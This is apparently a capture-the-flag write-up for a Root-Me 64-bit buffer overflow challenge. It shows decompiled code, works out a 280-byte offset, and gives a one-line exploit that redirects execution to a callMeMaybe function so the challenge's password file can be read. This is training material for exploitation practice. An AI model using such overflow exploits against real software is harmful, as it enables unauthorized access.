### S0lv3d by H4yicl3

First I download binary file with my scp-script
```
#!/bin/sh
echo "password = app-systeme-$1"
scp -P2222 app-systeme-$1@challenge02.root-me.org:./$1 ./

then ./scp [name_of_challenge]
```

I use IDA to analysis the code .
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [sp+10h] [bp-110h]@1  //try to find position of buf
  int v5; // [sp+11Ch] [bp-4h]@1

  __isoc99_scanf(0x4007EELL, &buf, envp);
  v5 = strlen(&buf);
  printf("Hello %s\n", &buf, argv);
  return 0;
}
```
based on here
```c
-0000000000000110 buf             db ? //0x110


+0000000000000008  r              db 8 dup(?) //+0x08
```
-->we need overflow 0x110+0x08=280
and we have the function callMeMaybe

```
.text:00000000004006CD callMeMaybe     proc near  
.text:00000000004006CD                 push    rbp
.text:00000000004006CE                 mov     rbp, rsp
```
address of callMeMaybe is 0x4006CD

but we need overflow 8byte because this program is 64 bit

the script to exploit is
```
(python -c 'print "A"*280+"\xcd\x06\x40\x00\x00\x00\x00\x00"';cat)|./ch35
```

now we can cat the .passwd ! GLHF ! 
